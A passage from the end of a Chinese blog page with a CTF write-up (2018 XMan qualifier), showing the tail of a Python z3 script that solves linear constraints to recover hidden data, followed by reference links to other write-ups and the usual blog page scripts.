    s.add(enc[i * 6 + 0] == n0 * data[0] + n1 * data[6] + n2 * data[12] + n3 * data[18] + n4 * data[24] + n5 * data[30])
    s.add(enc[i * 6 + 1] == n0 * data[1] + n1 * data[7] + n2 * data[13] + n3 * data[19] + n4 * data[25] + n5 * data[31])
    s.add(enc[i * 6 + 2] == n0 * data[2] + n1 * data[8] + n2 * data[14] + n3 * data[20] + n4 * data[26] + n5 * data[32])
    s.add(enc[i * 6 + 3] == n0 * data[3] + n1 * data[9] + n2 * data[15] + n3 * data[21] + n4 * data[27] + n5 * data[33])
    s.add(enc[i * 6 + 4] == n0 * data[4] + n1 * data[10] + n2 * data[16] + n3 * data[22] + n4 * data[28] + n5 * data[34])
    s.add(enc[i * 6 + 5] == n0 * data[5] + n1 * data[11] + n2 * data[17] + n3 * data[23] + n4 * data[29] + n5 * data[35])
    s.check()
    print s.model()
    if i == 5:
        break
    i += 1
</code></pre>
<h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="http://yugod.xmutsec.com/index.php/2018/08/10/42.html" target="_blank" rel="noopener">http://yugod.xmutsec.com/index.php/2018/08/10/42.html</a><br><a href="https://www.jianshu.com/p/028c0c6270c3" target="_blank" rel="noopener">https://www.jianshu.com/p/028c0c6270c3</a><br><a href="https://github.com/krx/CTF-Writeups/tree/master/CSAW%2016%20Quals/for150%20-%20Yaar%20Haar%20Fiddle%20Dee%20Dee" target="_blank" rel="noopener">https://github.com/krx/CTF-Writeups/tree/master/CSAW%2016%20Quals/for150%20-%20Yaar%20Haar%20Fiddle%20Dee%20Dee</a><br><a href="https://www.xctf.org.cn/library/details/9ab7dca891b9e53206b9aec7ab13ac9a95fbf66d/?from=groupmessage&amp;isappinstalled=0" target="_blank" rel="noopener">https://www.xctf.org.cn/library/details/9ab7dca891b9e53206b9aec7ab13ac9a95fbf66d/?from=groupmessage&amp;isappinstalled=0</a><br><a href="https://www.jianshu.com/p/110f715c210f" target="_blank" rel="noopener">https://www.jianshu.com/p/110f715c210f</a></p>

            </div>
            <hr>
            <div>
              <p>
                
                
                  <span>
                <i class="iconfont icon-tag"></i>
                    
                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                    
                      <a class="hover-with-bg" href="/tags/wp/">wp</a>
                    
                  </span>
                
              </p>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-12 col-md-6">
                    
                      <a href="/2018/08/22/2018-XMan结营赛/">
                        <i class="fa fa-chevron-left"></i>
                        <span>2018-XMan结营赛</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-12 col-md-6">
                    
                      <a href="/2018/07/21/2018-QCTF/">
                        <span>2018-QCTF</span>
                        <i class="fa fa-chevron-right"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

              
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="http://blog.b3ale.cn" target="_blank" rel="nofollow noopener"><b>Hard Work Pays Off.</b></a>
    </div>
    
  <div>
    
      <!-- 不蒜子统计PV -->
      
      <span id="busuanzi_container_site_pv" style="display: none">
      总访问量 <span id="busuanzi_value_site_pv"></span> 次
    </span>
    
    
      <!-- 不蒜子统计UV -->
      
      <span id="busuanzi_container_site_uv" style="display: none">
      总访客数 <span id="busuanzi_value_site_uv"></span> 人
    </span>
    
  </div>


    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
<script src="/js/main.js"></script>


  <script src="/js/lazyload.js"></script>



  
  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var toc = $('#toc');
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;
      var tocLimMax = 2 * boardTop + boardCtn.height();

      $(window).scroll(function () {
        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = boardCtn.css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>







  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<!-- Plugins -->



  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "2018-XMan个人排位赛&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>



  

  
    <!-- MathJax -->
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
          tex2jax: {
              inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
              processEscapes: true,
              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
          }
      });

      MathJax.Hub.Queue(function() {
          var all = MathJax.Hub.getAllJax(), i;
          for(i=0; i < all.length; i += 1) {
              all[i].SourceElement().parentNode.className += ' has-jax';
          }
      });

    </script>

    <script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->

  










</body>
</html>
